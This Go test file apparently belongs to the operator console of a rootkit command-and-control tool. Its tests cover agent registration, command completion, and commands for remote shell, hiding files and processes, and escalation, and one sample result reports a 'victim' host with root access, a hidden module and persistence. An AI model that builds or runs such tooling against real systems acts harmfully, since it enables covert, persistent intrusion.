package main

import (
	"context"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"github.com/coder/websocket"
)

func TestRegistryKeepsMultipleAgentsAndSwitchesTarget(t *testing.T) {
	registry := newAgentRegistry()
	srv, dial := dummyWSServer(t)
	defer srv.Close()

	c1 := dial()
	defer c1.CloseNow()
	c2 := dial()
	defer c2.CloseNow()

	registry.register("alpha", c1, [32]byte{})
	registry.register("bravo", c2, [32]byte{})
	sessions, active := registry.snapshot()
	if len(sessions) != 2 || active != "alpha" {
		t.Fatalf("snapshot = %d sessions, active %q", len(sessions), active)
	}
	if err := registry.selectAgent("bravo"); err != nil {
		t.Fatal(err)
	}
	current, err := registry.current()
	if err != nil || current.id != "bravo" {
		t.Fatalf("current = %#v, %v", current, err)
	}
	if err := registry.selectAgent("missing"); err == nil {
		t.Fatal("selecting an unknown agent succeeded")
	}
}

func TestSuggestionsIncludeConnectedAgentIDs(t *testing.T) {
	suggestions := suggestionsFor([]*agentSession{{id: "rklings-765f62ee"}})
	if !slices.Contains(suggestions, "use rklings-765f62ee") {
		t.Fatalf("suggestions do not contain connected agent: %v", suggestions)
	}
}

func TestCommonPrefix(t *testing.T) {
	if got := commonPrefix([]string{"use alpha", "use alpine"}); got != "use alp" {
		t.Fatalf("commonPrefix = %q", got)
	}
}

func TestTabCompletesSingleAgent(t *testing.T) {
	srv, dial := dummyWSServer(t)
	defer srv.Close()
	c := dial()
	defer c.CloseNow()

	reg := newAgentRegistry()
	reg.register("rklings-765f62ee", c, [32]byte{})
	testOp := &Operator{Agents: reg, Events: NewEventBus()}

	model := newConsole(testOp)
	model.input.SetValue("use rk")
	model.complete()
	if got := model.input.Value(); got != "use rklings-765f62ee" {
		t.Fatalf("completion = %q", got)
	}
}

func TestRegistryDisconnectSelectsRemainingAgent(t *testing.T) {
	registry := newAgentRegistry()
	srv, dial := dummyWSServer(t)
	defer srv.Close()

	c1 := dial()
	defer c1.CloseNow()
	c2 := dial()
	defer c2.CloseNow()

	registry.register("alpha", c1, [32]byte{})
	registry.register("bravo", c2, [32]byte{})

	registry.remove("alpha")
	current, err := registry.current()
	if err != nil || current.id != "bravo" {
		t.Fatalf("current = %#v, %v", current, err)
	}
}

func TestProtocolCommand(t *testing.T) {
	tests := []struct {
		name, arg, want string
	}{
		{"ping", "", "PING"},
		{"exec", "id -u", "SHELL id -u"},
		{"hide", "file secret", "HIDE FILE secret"},
		{"unhide", "pid 2", "UNHIDE PID 2"},
		{"escalate", "42", "ESCALATE 42"},
	}
	for _, test := range tests {
		got, err := protocolCommand(test.name, test.arg)
		if err != nil || got != test.want {
			t.Errorf("protocolCommand(%q, %q) = %q, %v; want %q", test.name, test.arg, got, err, test.want)
		}
	}
}

func TestFormatInfoProducesReadableSummary(t *testing.T) {
	result := formatCommandResult(commandResult{
		command: "INFO",
		output:  `{"hostname":"victim","kernel":"7.0.0","arch":"amd64","pid":900,"uid":0,"module_hidden":true,"persisted":true,"hidden":{"file":["rklings"],"port":["4444"]}}`,
	})
	for _, want := range []string{"victim", "7.0.0", "pid=900", "persistence", "file", "4444"} {
		if !strings.Contains(result, want) {
			t.Errorf("formatted INFO does not contain %q: %q", want, result)
		}
	}
	if strings.Contains(result, `{"hostname"`) {
		t.Fatalf("formatted INFO contains raw JSON: %q", result)
	}
}

func TestParseShellResultPreservesStreamsAndExitCode(t *testing.T) {
	got := parseShellResult(`SHELL_RESULT {"stdout":"out\n","stderr":"warn\n","exit_code":7}`)
	if got.stdout != "out\n" {
		t.Errorf("stdout = %q", got.stdout)
	}
	if got.stderr != "warn\n" {
		t.Errorf("stderr = %q", got.stderr)
	}
	if got.exitCode != 7 {
		t.Errorf("exitCode = %d", got.exitCode)
	}
}

func dummyWSServer(t *testing.T) (*httptest.Server, func() *websocket.Conn) {
	t.Helper()
	conns := make(chan *websocket.Conn, 8)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
			InsecureSkipVerify: true,
		})
		if err != nil {
			return
		}
		conns <- c
	}))
	dial := func() *websocket.Conn {
		wsURL := "ws" + strings.TrimPrefix(srv.URL, "http")
		c, _, err := websocket.Dial(context.Background(), wsURL, nil)
		if err != nil {
			t.Fatalf("dial dummy ws: %v", err)
		}
		<-conns
		return c
	}
	return srv, dial
}
